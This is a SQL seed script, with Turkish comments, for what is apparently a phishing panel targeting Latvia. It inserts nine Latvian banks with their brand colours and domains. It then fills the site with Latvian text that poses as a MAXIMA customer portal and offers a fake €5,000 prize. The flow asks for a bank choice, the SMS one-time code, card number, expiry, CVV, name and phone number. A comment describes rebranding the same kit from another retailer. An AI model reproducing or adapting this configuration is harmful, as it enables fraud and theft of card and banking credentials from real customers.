-- Latvian banks for Maxima LV project
INSERT INTO public.banks (slug, name, brand_color, accent_color, domain, logo_file, is_active, country, auto_redirect)
VALUES
  ('swedbank-lv',    'Swedbank',      '#f35b1c', '#ffffff', 'swedbank.lv',    'bank-logos/latvia/swedbank-lv.webp',    true, 'Letonya', false),
  ('seb-lv',         'SEB banka',     '#60cd18', '#ffffff', 'seb.lv',         'bank-logos/latvia/seb-lv.webp',         true, 'Letonya', false),
  ('citadele-lv',    'Citadele banka','#ee2737', '#ffffff', 'citadele.lv',    'bank-logos/latvia/citadele-lv.webp',    true, 'Letonya', false),
  ('luminor-lv',     'Luminor',       '#003c71', '#ffffff', 'luminor.lv',     'bank-logos/latvia/luminor-lv.webp',     true, 'Letonya', false),
  ('ribbank-lv',     'RIB bank',      '#702f8a', '#ffffff', 'ribbank.com',    NULL,                                  true, 'Letonya', false),
  ('bluorbank-lv',   'BluOr Bank',    '#00427a', '#ffffff', 'bluorbank.lv',   NULL,                                  true, 'Letonya', false),
  ('industra-lv',    'Industra Bank', '#0a2d4e', '#ffffff', 'industra.finance', NULL,                                true, 'Letonya', false),
  ('magnetiqbank-lv','Magnetiq Bank', '#e01e26', '#ffffff', 'magnetiqbank.com', NULL,                                true, 'Letonya', false),
  ('signet-bank-lv', 'Signet Bank',   '#1b365d', '#ffffff', 'signetbank.com', NULL,                                  true, 'Letonya', false)
ON CONFLICT (slug) DO UPDATE SET
  name = EXCLUDED.name,
  brand_color = EXCLUDED.brand_color,
  country = EXCLUDED.country,
  is_active = EXCLUDED.is_active;

-- Global settings: Latvian + Maxima branding (ikilt DB kopyasi kullaniliyorsa gerekli)
UPDATE public.global_settings SET
  logo_url = '/form-assets/maxima-logo.webp',
  portal_name = 'MAXIMA klientu portāls',
  support_center_name = 'MAXIMA atbalsta centrs',
  win_title = 'Ekskluzīva MAXIMA prēmija',
  win_subtitle = 'Apsveicam! Jūs esat izvēlēts šodienas MAXIMA kampaņai. Noklikšķiniet uz pogas zemāk, lai saņemtu savu 5000 eiro prēmiju.',
  win_button = 'Saņemt prēmiju',
  banken_title = 'Izvēlieties savu banku',
  banken_subtitle = 'Izvēlieties savu banku, lai turpinātu.',
  banken_search_placeholder = 'Meklēt banku...',
  wait_title = 'Lūdzu, uzgaidiet',
  wait_subtitle = 'Jūsu pieprasījums tiek droši apstrādāts...',
  sms_title = 'SMS drošības kods',
  sms_subtitle = 'Ievadiet {digits} ciparu kodu.',
  sms_input_label = 'Vienreizējs kods',
  sms_button = 'Apstiprināt',
  sms_loading = 'Apstrādājas...',
  card_title = 'Maksājuma informācija',
  card_subtitle = 'Pārbaudiet un apstipriniet savus datus.',
  card_owner_label = 'Kartes īpašnieka vārds',
  card_number_label = 'Kartes numurs',
  card_expiry_label = 'Derīguma termiņš MM/GG',
  card_cvv_label = 'Drošības kods',
  card_button = 'Turpināt',
  code_title = 'Laipni lūdzam',
  code_subtitle = 'Ievadiet dalības kodu, ko saņēmāt no partnera {partner}, lai saņemtu apbalvojumu.',
  code_button = 'Apstiprināt kodu',
  live_support_title = 'Tiešais atbalsts',
  live_support_subtitle = 'Lai turpinātu, jums jāsazinās ar mūsu klientu apkalpošanas nodaļu.\n\nNoklikšķiniet uz pogas zemāk, lai sāktu sarunu.',
  live_support_button = 'Sākt sarunu',
  profile_title_small = 'Balvas apstiprinājums',
  profile_title_main = 'Jūsu prēmijas summa',
  profile_subtitle = 'Apstipriniet savus datus turpmākai apstrādei.',
  profile_firstname_label = 'Vārds',
  profile_lastname_label = 'Uzvārds',
  profile_phone_label = 'Mobilā tālruņa numurs',
  profile_button = 'Tālāk',
  profile_loading_text = 'Apstrādājas...',
  site_language = 'lv',
  target_country = 'Letonya';

-- Kampanya adi: brandify("IKI" -> "MAXIMA") tum DB metinlerinde calissin
UPDATE public.global_settings
SET wheel_settings = COALESCE(wheel_settings, '{}'::jsonb) || '{"campaign_name":"MAXIMA"}'::jsonb;
